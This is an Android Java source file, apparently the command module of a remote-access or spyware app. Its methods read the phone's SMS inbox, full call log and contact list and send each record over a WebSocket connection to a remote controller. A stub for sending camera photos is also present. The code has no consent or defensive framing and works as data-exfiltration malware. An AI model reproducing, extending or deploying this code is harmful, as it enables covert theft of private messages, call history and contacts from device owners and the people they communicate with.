package tosatto.simonepio;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import tech.gusavila92.websocketclient.WebSocketClient;

public class CommandClass {

    public static List<String> sendMsgLog(Context context, WebSocketClient webSocketClient){
        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur != null && cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String date = cur.getString(cur.getColumnIndexOrThrow("date"));
            Date dateReadable = new Date(Long.parseLong(date));

            sms.add("Number: " + address + " Date: " + dateReadable + " Message: " + body + "\n\n");
            webSocketClient.send("msg|"+sms);
        }

        if (cur != null) {
            cur.close();
        }

        Log.i("WebSocket","messaggi inviati");
        return sms;
    }

    public static String sendCalls(ContentResolver cr, WebSocketClient webSocketClient) {
        // reading all data in descending order according to DATE
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor cur = cr.query(callUri, null, null, null, strOrder);
        // loop through cursor
        String calls = "";
        while (cur.moveToNext()) {
            String callNumber = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
            String callName = cur
                    .getString(cur
                            .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
            String callDate = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat(
                    "dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
            String callType = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.TYPE));
            String isCallNew = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.NEW));
            String duration = cur.getString(cur
                    .getColumnIndex(android.provider.CallLog.Calls.DURATION));
            // process log data...
            webSocketClient.send("calls|"+callNumber+" "+callName+" "+callDate+" "+dateString+" "+callType+" "+isCallNew+" "+duration+"\n");
        }
        //Log.i("WebSocket", calls.toString());
        Log.i("WebSocket","chiamate inviate");
        return calls;
    }

    public static void sendContacts(ContentResolver cr, WebSocketClient webSocketClient) {
        ArrayList<String> nameList = new ArrayList<>();
        String phoneNo = "";
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));
                nameList.add(name);
                if (cur.getInt(cur.getColumnIndex( ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                    }
                    pCur.close();
                }
                webSocketClient.send("contacts|"+id+" " + name + " " + phoneNo+ " ");
            }
        }
        if (cur != null) {
            cur.close();
        }
        Log.i("WebSocket","contatti inviati");
    }

    public static void sendCameraPhoto(ContentResolver contentResolver, WebSocketClient webSocketClient) {
    }
}
